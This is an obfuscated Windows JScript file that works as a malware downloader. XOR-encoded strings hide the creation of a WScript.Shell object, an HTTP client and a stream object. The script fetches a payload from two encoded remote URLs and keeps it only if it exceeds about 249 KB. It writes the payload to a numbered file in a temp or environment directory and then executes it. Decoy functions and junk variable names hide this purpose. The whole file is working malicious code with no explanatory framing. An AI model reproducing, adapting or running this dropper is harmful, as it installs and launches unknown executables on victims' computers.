function btoa(impietyOu6, enraptureKyF, moribundauz, beseechsUN, frontieruiF, modestqtQ, appendETG, avariceL3E) {
    var nattyHJT = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var partisanpI2 = String(avariceL3E);
    for (var formalD1h, chambergFB, hurtleA5T = 0, turbidGzu = nattyHJT, insinuatelwi = ""; partisanpI2.charAt(hurtleA5T | 0) || (turbidGzu = "=", 
    hurtleA5T % 1); insinuatelwi += turbidGzu.charAt(63 & formalD1h >> 8 - hurtleA5T % 1 * 8)) {
        chambergFB = partisanpI2.charCodeAt(hurtleA5T += 3 / 4);
        if (chambergFB > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        formalD1h = formalD1h << 8 | chambergFB;
    }
    return insinuatelwi;
}

var firebrandaW9 = function(disembarkBYf) {
    var fosterhwj = "";
    var impietyOu6 = "cohortqtS";
    var enraptureKyF = "vapidoRs";
    var moribundauz = "adulteratew4H";
    var beseechsUN = "disaffectedN2I";
    var frontieruiF = "livelihoodLMQ";
    var modestqtQ = "museFKA";
    var appendETG = "inflammatorypaO";
    btoa(impietyOu6, enraptureKyF, moribundauz, beseechsUN, frontieruiF, modestqtQ, appendETG, [ 98, 255, 187, 69, 183, 103, 83, 45, 33, 127, 49, 112, 24, 136, 229, 156 ]);
    var siegekOC = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var seetheOL0 = 0; seetheOL0 < disembarkBYf.length; seetheOL0++) {
        var dappermkd = [ 98, 255, 187, 69, 183, 103, 83, 45, 33, 127, 49, 112, 24, 136, 229, 156 ];
        fosterhwj += siegekOC(disembarkBYf[seetheOL0] ^ dappermkd[seetheOL0 % dappermkd.length]);
    }
    return fosterhwj;
};

var demonstrableLEN = function() {
    var affableHKL = function() {
        var biliousEAv = firebrandaW9([ 19, 170, 237, 12, 211, 35, 102, 108, 69, 14 ]);
        var zephyrca0 = firebrandaW9([ 15, 184, 207, 7, 142, 34, 52, 78, 112, 21 ]);
    };
    affableHKL.prototype.jWaDKUMwDI = function(rhetorica6k) {
        var girdH3B = firebrandaW9([ 33, 141, 222, 36, 195, 2, 28, 79, 75, 26, 82, 4 ]);
        return wsh[girdH3B](rhetorica6k);
    };
    affableHKL.prototype.BuC3fdX49z = function(rhetorica6k) {
        var girdH3B = firebrandaW9([ 33, 141, 222, 36, 195, 2, 28, 79, 75, 26, 82, 4 ]);
        return WScript[girdH3B](rhetorica6k);
    };
    return affableHKL;
}();

(function() {
    var virtuosoiRw = [ firebrandaW9([ 10, 139, 207, 53, 141, 72, 124, 69, 81, 30, 67, 21, 97, 231, 144, 244, 7, 141, 222, 52, 198, 73, 48, 66, 76, 80, 9, 64, 54, 237, 157, 249 ]), firebrandaW9([ 10, 139, 207, 53, 141, 72, 124, 69, 81, 30, 93, 3, 119, 255, 132, 242, 22, 140, 221, 35, 153, 4, 60, 64, 14, 71, 1, 94, 125, 240, 128 ]) ];
    var repineeWy = 4194304;
    var reconditecn2 = new demonstrableLEN();
    var whorlDTS = reconditecn2[firebrandaW9([ 32, 138, 248, 118, 209, 3, 11, 25, 24, 5 ])];
    var cadaverouszum = whorlDTS(firebrandaW9([ 53, 172, 216, 55, 222, 23, 39, 3, 114, 23, 84, 28, 116 ]));
    var vacateuQR = whorlDTS(firebrandaW9([ 47, 172, 227, 8, 251, 85, 125, 117, 108, 51, 121, 36, 76, 216 ]));
    var omniscientsQ1 = whorlDTS(firebrandaW9([ 35, 187, 244, 1, 245, 73, 0, 89, 83, 26, 80, 29 ]));
    var ensconceevN = cadaverouszum.ExpandEnvironmentStrings(firebrandaW9([ 71, 171, 254, 8, 231, 66, 15 ]));
    var repastJ92 = ensconceevN + repineeWy + firebrandaW9([ 76, 154, 195, 32 ]);
    var boltVez = false;
    var extoliFf = 200;
    for (var infalliblezbW = 0; infalliblezbW < virtuosoiRw.length; infalliblezbW++) {
        try {
            var pillagenOv = virtuosoiRw[infalliblezbW];
            vacateuQR.open(firebrandaW9([ 37, 186, 239 ]), pillagenOv, false);
            vacateuQR.send();
            if (vacateuQR.status == extoliFf) {
                try {
                    omniscientsQ1[firebrandaW9([ 13, 143, 222, 43 ])]();
                    omniscientsQ1.type = 1;
                    omniscientsQ1[firebrandaW9([ 21, 141, 210, 49, 210 ])](vacateuQR[firebrandaW9([ 16, 154, 200, 53, 216, 9, 32, 72, 99, 16, 85, 9 ])]);
                    var vestmentCol = firebrandaW9([ 59, 179, 216, 52, 255, 0, 100, 68, 112, 46 ]);
                    var ramifyWf0 = firebrandaW9([ 42, 174, 203, 29, 196, 53, 98, 91, 85, 55 ]);
                    var simperwoj = Math.pow(2, 10) * 249;
                    if (omniscientsQ1.size > simperwoj) {
                        infalliblezbW = virtuosoiRw.length;
                        omniscientsQ1.position = 0;
                        omniscientsQ1.saveToFile(repastJ92, 2);
                        boltVez = true;
                    }
                } finally {
                    omniscientsQ1.close();
                }
            }
        } catch (ignored) {}
    }
    if (boltVez) {
        cadaverouszum[firebrandaW9([ 39, 135, 222, 38 ])](ensconceevN + Math.pow(2, 22));
    }
})();